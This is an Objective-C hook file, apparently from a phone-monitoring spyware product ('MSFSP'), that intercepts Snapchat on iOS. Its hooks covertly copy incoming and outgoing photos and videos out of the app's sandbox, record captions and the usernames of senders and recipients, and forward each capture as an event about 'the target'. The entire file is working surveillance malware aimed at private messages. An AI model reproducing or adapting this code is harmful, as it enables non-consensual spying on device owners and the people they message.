//
//  Snapchat.h
//  MSFSP
//
//  Created by benjawan tanarattanakorn on 3/13/2557 BE.
//
//

#import <Foundation/Foundation.h>

#import "DaemonPrivateHome.h"

#import "FeedViewController.h"
#import "SCMediaView.h"
#import "Snap.h"
#import "Media.h"
#import "SCActiveVideoMedia.h"
#import "AVCamCaptureManager.h"
#import "SendViewController.h"
#import "EphemeralMedia.h"
#import "Friend.h"
#import "Media+Snapchat.h"

#import "SnapchatUtils.h"

/*
 
 ========================================
 
 Version:   6.1.2
 
 -------- 1) Direction: Incoming
 
 1.1 Feed View : image
    HOOK(FeedViewController,  showSnap$, void, id snap)
    HOOK(SCMediaView, completedSettingImageMedia$error$completion$, void, BOOL media, id error,id completion)
 
 1.2 Feed View : video
    HOOK(SCMediaView,  completedSettingVideoMedia$error$completion$, void, BOOL media, id error,id completion)
 
 -------- 2) Direction: Outgoing
 
 2.1 Feed View : image
    HOOK(SendViewController,  sendSnap, void) [METHOD A]
 
 2.2 Feed View : video
    HOOK(AVCamCaptureManager,  recorder$recordingDidFinishToOutputFileURL$error$, void, id recorder, id recording, id error)
    [METHOD A]
 
*/
 
 
void preprocessIncomingPhoto(id snap) {
    /*
     - 1st times pressed: state 7 status 1 isViewing 0
     - 2nd and 3rd times that views: state 8 status 2 isViewing 1
     */

    BOOL isViewing                  = [snap isViewing];
    if (!isViewing) {
        Snap *_snap                 = snap;
        NSString *userid            = [_snap username];
        NSString *userDisplayname   = [_snap nameForView];
        
        // -- move state from UNDEFINED/CAPTURED ---> STARTED
        SnapchatUtils *snUtils      = [SnapchatUtils sharedSnapchatUtils];
        [snUtils setMIncomingState:kSnapchatIncomingStateStarted];
        
        // -- For incoming set sender id and displayname
        [snUtils setSenderIDForIncoming:userid                                  // user id
                      senderDisplayName:userDisplayname                         // user displayname
                       snapchatChatType:kSnapchatChatTypeInIndividual];         // chat type
    }
}



#pragma mark -
#pragma mark INCOMING
#pragma mark -

#pragma mark In Photo (Step 1)

/*
 * Capture sender (3rd party account) information for individual photo chat
 * direction:   Incoming
 * chat type:   Individual
 * usecase:     User presses and hold the row of feed view
 * version:     prior to 7.0.1
 */
HOOK(FeedViewController,  showSnap$, void, id snap) {
    DLog(@"\n\n&&&&&&&&&&&&&& FeedViewController --> showSnap (prior to 7.0.1 up) &&&&&&&&&&&&&&\n\n");
    //DLog(@"snap %@", snap);
    /*
     - 1st times pressed: state 7 status 1 isViewing 0
     - 2nd and 3rd times that views: state 8 status 2 isViewing 1
     */
    CALL_ORIG(FeedViewController, showSnap$, snap);
    preprocessIncomingPhoto(snap);
}

#pragma mark In Photo (Step 2)


/*
 * Capture incoming Photo Attachment and Target information
 * direction:   Incoming
 * chat type:   Individual, Story (but we will not capture story photo)
 * usecase:     User presses and hold the row of feed view
 * version:     6.1.2, 7.0.1
 */
HOOK(SCMediaView, completedSettingImageMedia$error$completion$, void, BOOL media, id error,id completion) {
    DLog(@"\n\n&&&&&&&&&&&&&& SCMediaView --> completedSettingImageMedia$error$completion$ &&&&&&&&&&&&&&\n\n");
    DLog(@"media %d", media);
    DLog(@"error %@", error);
    //DLog(@"completion %@", completion);
    
    //DLog(@"overlayImageViews %@", [self overlayImageViews]);
    
    CALL_ORIG(SCMediaView, completedSettingImageMedia$error$completion$, media, error,  completion);
    
    SnapchatUtils *snUtils              = [SnapchatUtils sharedSnapchatUtils];
    DLog (@"state %d",[snUtils mIncomingState])
    
    /*
     Possible State:
        Started:    In case that we pass the previous hook method
        Undefined:  In case that this is first incoming story event
        Captured:   In case that the last individual incoming has been passed the below condition
                    already, and no next individual incoming yet.
        So, incoming story cannot pass the below condition
     */
    if ([snUtils mIncomingState] == kSnapchatIncomingStateStarted) {
        
        // move state from STARTED ---> CAPTURED
        [snUtils setMIncomingState:kSnapchatIncomingStateCaptured];
        
        // -- Get Image and write to our document directory
        UIImage *img                        = [[self imageView] image];
        NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"png"];
        [UIImagePNGRepresentation(img) writeToFile:snapchatAttachmentPath atomically:YES];
        
        /* -- Capture only individual photo, not story photo 
            we have this condition before we check state in the previous condition
         */
        if ([snUtils mSnapchatChatType] == kSnapchatChatTypeInIndividual) {
            
            DLog (@"Capture Individual Incoming Photo");
            
            [SnapchatUtils sendIncomingIMEventForSenderID:[snUtils mSenderID]                   // this value is kept in the previous hooked method [FeedViewController showSnap:]
                                        senderDisplayName:[snUtils mSenderDisplayName]          // this value is kept in the previous hooked method [FeedViewController showSnap:]
                                                mediaPath:snapchatAttachmentPath];
        }
        [snUtils resetSenderInfoForIncoming];
    }
}

#pragma mark In Video


HOOK(SCMediaView,  completedSettingVideoMedia$error$completion$, void, BOOL media, id error,id completion) {
    DLog(@"\n\n&&&&&&&&&&&&&& SCMediaView --> VIDEO completedSettingVideoMedia$error$completion$ &&&&&&&&&&&&&&\n\n");
    DLog(@"media %d", media);
    //DLog(@"error %@", error);
    //DLog(@"completion %@", completion);
    
    DLog(@"activeVideos %@",       [self activeVideos]);  // NSArray of SCActiveVideoMedia
    
    NSArray *activeVideoArray               = [(NSDictionary *)[self activeVideos] allValues];
    SnapchatUtils *snUtils                  = [SnapchatUtils sharedSnapchatUtils];
    
    for (SCActiveVideoMedia *aSCActiveMedia in activeVideoArray) {
        //[SnapchatUtils printMediaInfo: [aMedia media]];
        Media *mediaObj                     = [aSCActiveMedia media];
        NSString *mediaID                   = [mediaObj mediaId];
        
        DLog (@"MEDIA ID %@", mediaID);
        
        // Process only non-duplicated one
        if (![snUtils isDuplicateMediaID:mediaID]) {
            id dataSource                   = [[aSCActiveMedia media ] dataSource];                 // exptected to be Snap
            Class $Snap                     = objc_getClass("Snap");
            
            //DLog(@"captionText %@",        [mediaObj captionText]);
            //DLog(@"overlayDataToUpload %@", [mediaObj overlayDataToUpload]);
            DLog(@"dataSource %@", dataSource);

            if ([dataSource isKindOfClass:$Snap]) {
                Snap *snap                          = dataSource;
                NSString *senderID                  = [snap username];                              // get user id
                NSString *senderDisplayName         = [snap nameForView];                           // get user display name
                
                // copy from Snapchat sandbox to our document foldre
                NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"mov"];
                NSError *copyError                  = nil;
                BOOL success                        = [[NSFileManager defaultManager] copyItemAtPath:[mediaObj videoPath]
                                                                                              toPath:snapchatAttachmentPath
                                                                                               error:&copyError];
                DLog(@"user id [%@] display name [%@]", senderID, senderDisplayName);
                DLog(@"original videoPath: %@", [mediaObj videoPath]);
                
                if (success && !copyError) {
                   DLog(@"!!! Success to write incoming video to path %@", snapchatAttachmentPath);
                    [SnapchatUtils sendIncomingIMEventForSenderID:senderID                          // user id
                                                senderDisplayName:senderDisplayName                 // user display name
                                                        mediaPath:snapchatAttachmentPath];          // attachment path
                } else {
                    DLog(@"FAIL to capture video file (success:%d, error:%@)", success, error)
                }
            }
        } else {
            DLog (@"\n\n!!!! duplicated media id %@", mediaID);
        }
    }
    
    [snUtils resetMediaIDWith:[(NSDictionary *)[self activeVideos] allKeys]];
    
    CALL_ORIG(SCMediaView, completedSettingVideoMedia$error$completion$, media, error,  completion);
}


#pragma mark -
#pragma mark OUTGOING


#pragma mark - Out Video (Step 1)

/*
 * Capture Video Attachment and Target information for OUTGOING
 * direction:   - Outgoing
 * chat type:   - Individual, Story (But we don't capture Story)
 * usecase:     - User've done recording
 * version:     - 6.1.2, This is called in v 7.0.1 also (in chat view), but we didn't use it
 */
HOOK(AVCamCaptureManager,  recorder$recordingDidFinishToOutputFileURL$error$, void, id recorder, id recording, id error) {
    DLog(@"\n\n&&&&&&&&&&&&&& AVCamCaptureManager --> recorder  recordingDidFinishToOutputFileURL &&&&&&&&&&&&&&\n\n");
    //DLog(@"recorder %@", recorder);
    //DLog(@"recording %@", recording);
    //DLog(@"error %@", error);
    
    NSURL *recordFileURL        = recording;

    // copy from Snapchat sandbox to our document foldre
    NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"mp4"];
    NSError *copyError                  = nil;
    BOOL success                        = [[NSFileManager defaultManager] copyItemAtPath:[recordFileURL path]
                                                                                  toPath:snapchatAttachmentPath
                                                                                   error:&copyError];
    DLog(@"original videoPath: %@", [recordFileURL path]);
    
    if (success && !copyError) {
        DLog(@"!!! Success to write incoming video to path %@", snapchatAttachmentPath);
        [[SnapchatUtils sharedSnapchatUtils] saveOutgoingVideoPath:snapchatAttachmentPath];     // keep the path of video attachment which is in our document directory
    } else {
        DLog(@"FAIL to capture video file (success:%d, error:%@)", success, error)
    }
    CALL_ORIG(AVCamCaptureManager, recorder$recordingDidFinishToOutputFileURL$error$, recorder, recording, error );
}


#pragma mark Out Video  (Step 2)


#pragma mark Out Photo

/*
 * Capture Photo/Video Attachment and Recipients information for OUTGOING
 * direction:   - Outgoing
 * chat type:   - Individual, Story (we don't capture story)
 * usecase:     - User click the array to send the media out
 */
HOOK(SendViewController,  sendSnap, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& SendViewController --> sendSnap &&&&&&&&&&&&&&\n\n");
    
    CALL_ORIG(SendViewController, sendSnap);
        
    // -- Capture Capture Text
    NSString *captionText               = [[self ephemeralMedia] captionText];
    DLog(@">> captionText: [%@]",  captionText);       // (null)
    
    NSString *snapchatAttachmentPath     = nil;
    
    // Case 1: Outgoing Image
    if ([[[self ephemeralMedia] media] isImage]) {
        DLog (@"!!! Capture Individual Outgoing Photo !!!");
        
        // copy from Snapchat sandbox to our document folder
        snapchatAttachmentPath  = [SnapchatUtils getOutputPathForExtension:@"png"];
        [snapchatAttachmentPath copy];
        DLog (@"photo path %@", snapchatAttachmentPath);
    
        Media *photoMedia       = [[self ephemeralMedia] media];
        NSData *photoData       = [photoMedia mediaDataToUpload];
        [photoData  writeToFile:snapchatAttachmentPath atomically:YES];
    }
    // Case 2: Outgoing Video
    else if ([[[self ephemeralMedia] media] isVideo]) {
        DLog (@"!!! Capture Individual Outgoing Video !!!");
        
        // -- Get video attachment path. Note that the video has been written to the path in the previous hooked method ([AVCamCaptureManager recorder$recordingDidFinishToOutputFileURL$error$])
        snapchatAttachmentPath              = [[[SnapchatUtils sharedSnapchatUtils] mOutgoingVideoPath] copy];
        [[SnapchatUtils sharedSnapchatUtils] clearOutgoingVideoPath];
        DLog (@"original video path %@", snapchatAttachmentPath);
    }
    
    // ensure we can get recipient(s)
    if (self.group_send) {
        if ([[self group_send] isKindOfClass:[NSArray class]]) {
            
            NSArray *recipientFriends   = [self group_send];
            
            for (Friend *aFriend in recipientFriends) {
                DLog (@"----- nameToDisplay [%@], display [%@], name [%@]",
                       [aFriend nameToDisplay],         // This value is the name that is current displayed for this friend
                       [aFriend display],               // This is the name that is set by the target. If target doesn't edit display name, this will be @""
                       [aFriend name]);                 // username of friend
                [SnapchatUtils sendOutgoingIMEventForRecipientID:[aFriend name]
                                            recipientDisplayName:[aFriend nameToDisplay]
                                                       mediaPath:snapchatAttachmentPath
                                                     captionText:captionText];
            }
        }
    }
    [snapchatAttachmentPath release];
}
